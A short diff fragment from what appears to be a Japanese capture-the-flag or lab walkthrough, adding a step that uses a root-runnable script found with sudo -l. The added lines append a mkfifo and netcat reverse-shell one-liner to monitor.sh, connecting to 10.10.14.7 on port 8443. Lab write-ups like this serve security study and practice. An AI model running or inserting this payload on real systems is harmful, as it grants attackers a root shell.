@@ -77,7 +77,7 @@ whoami
 root
 ```
 
-### 
+### netcat /tmp/f
 sudo -l で root 権限で実行できるファイルを見つけ、以下コマンドで netcat できるようにする。
 ```
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 8443 >/tmp/f' | tee -a monitor.sh
